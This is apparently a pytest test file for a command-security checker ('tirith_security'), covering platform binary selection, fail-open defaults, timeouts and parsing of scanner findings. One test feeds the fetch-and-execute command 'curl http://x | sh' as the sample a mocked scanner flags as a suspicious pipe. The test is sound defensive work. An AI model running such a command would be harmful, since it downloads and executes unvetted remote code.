"""Test tirith_security (Phase 3, H1)."""

from __future__ import annotations

import json
import sys
from unittest.mock import patch

import pytest

from eaccode import tirith_security


class TestPlatform:
    def test_picks_windows_target(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(tirith_security.platform, "system", lambda: "Windows")
        monkeypatch.setattr(
            tirith_security.platform, "machine", lambda: "AMD64"
        )
        assert tirith_security._platform_target() == (
            "tirith-x86_64-pc-windows-msvc.zip"
        )

    def test_picks_linux_x64(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(tirith_security.platform, "system", lambda: "Linux")
        monkeypatch.setattr(
            tirith_security.platform, "machine", lambda: "x86_64"
        )
        assert tirith_security._platform_target() == (
            "tirith-x86_64-unknown-linux-gnu.tar.gz"
        )


class TestFailOpenDefault:
    def test_default_is_fail_open(self) -> None:
        assert tirith_security._tirith_fail_open_setting() is True


class TestCheckCommand:
    def test_falls_back_to_allow_when_unavailable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        # ensure_installed returns (None, error) when no binary
        monkeypatch.setattr(
            tirith_security, "ensure_installed", lambda: (None, "no binary")
        )
        # Fail-open default
        monkeypatch.setattr(
            tirith_security, "_tirith_fail_open_setting", lambda: True
        )
        result = tirith_security.check_command_security("ls -la")
        assert result["action"] == "allow"

    def test_fail_closed_synthesizes_warning(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(
            tirith_security, "ensure_installed", lambda: (None, "no binary")
        )
        monkeypatch.setattr(
            tirith_security, "_tirith_fail_open_setting", lambda: False
        )
        result = tirith_security.check_command_security("ls -la")
        assert result["action"] == "warn"
        assert any(f["rule_id"] == "tirith-install-error" for f in result["findings"])

    def test_parses_json_output(self, monkeypatch: pytest.MonkeyPatch) -> None:
        json_response = json.dumps(
            {
                "action": "warn",
                "findings": [
                    {
                        "rule_id": "test",
                        "severity": "MEDIUM",
                        "title": "Suspicious pipe",
                        "description": "Pipes to sh",
                        "remediation_hint": "Use direct file write instead",
                    }
                ],
                "summary": "1 finding",
            }
        )

        class _Proc:
            returncode = 1
            stdout = json_response
            stderr = ""

        fake_path = tirith_security._install_path()
        fake_path.parent.mkdir(parents=True, exist_ok=True)
        fake_path.write_text("")  # existiert

        monkeypatch.setattr(
            tirith_security, "ensure_installed", lambda: (fake_path, "")
        )
        monkeypatch.setattr(
            tirith_security, "_tirith_fail_open_setting", lambda: True
        )
        with patch.object(tirith_security.subprocess, "run", return_value=_Proc()):
            result = tirith_security.check_command_security("curl http://x | sh")
        assert result["action"] == "warn"
        assert result["findings"][0]["title"] == "Suspicious pipe"

    def test_handles_bad_json(self, monkeypatch: pytest.MonkeyPatch) -> None:
        class _Proc:
            returncode = 0
            stdout = "not json"
            stderr = ""

        fake_path = tirith_security._install_path()
        fake_path.parent.mkdir(parents=True, exist_ok=True)
        fake_path.write_text("")

        monkeypatch.setattr(
            tirith_security, "ensure_installed", lambda: (fake_path, "")
        )
        monkeypatch.setattr(
            tirith_security, "_tirith_fail_open_setting", lambda: True
        )
        with patch.object(tirith_security.subprocess, "run", return_value=_Proc()):
            result = tirith_security.check_command_security("ls")
        # non-dict JSON parsed to fail-open allow
        assert result["action"] == "allow"

    def test_handles_timeout(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import subprocess as _sp

        fake_path = tirith_security._install_path()
        fake_path.parent.mkdir(parents=True, exist_ok=True)
        fake_path.write_text("")

        monkeypatch.setattr(
            tirith_security, "ensure_installed", lambda: (fake_path, "")
        )
        monkeypatch.setattr(
            tirith_security, "_tirith_fail_open_setting", lambda: True
        )
        with patch.object(
            tirith_security.subprocess,
            "run",
            side_effect=_sp.TimeoutExpired("tirith", 10),
        ):
            result = tirith_security.check_command_security("ls")
        assert result["action"] == "allow"
